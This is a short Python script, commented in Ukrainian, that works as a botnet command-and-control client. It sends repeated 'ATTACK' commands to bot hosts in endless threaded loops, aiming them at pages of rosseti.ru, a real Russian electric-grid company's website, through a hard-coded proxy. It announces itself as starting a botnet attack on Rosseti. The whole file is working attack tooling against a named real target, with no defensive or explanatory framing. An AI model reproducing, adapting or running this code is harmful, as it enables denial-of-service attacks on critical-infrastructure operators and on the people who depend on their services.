import requests
import threading
import time
import random
import socket

# Конфігурація
target_urls = [
    "https://rosseti.ru",
    "https://rosseti.ru/about",
    "https://rosseti.ru/contact"
]
bot_ips = ["192.168.1.14:5000", "bot2.local:5000"]  # Замініть на реальні IP:порт ботів
proxies = {
    "http": "http://181.65.121.34:8080",
    "https": "https://181.65.121.34:8080"
}

def send_command(bot_ip):
    while True:
        target = random.choice(target_urls)
        command = f"ATTACK {target}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((bot_ip.split(":")[0], int(bot_ip.split(":")[1])))
                s.send(command.encode())
                response = s.recv(1024).decode()
                print(f"Відповідь від {bot_ip}: {response}")
        except Exception as e:
            print(f"Помилка з {bot_ip}: {e}")
        time.sleep(1)

def main():
    print("Розпочинаю ботнет-атаку на Россети...")
    threads = []
    for bot_ip in bot_ips:
        t = threading.Thread(target=send_command, args=(bot_ip,))
        t.daemon = True
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
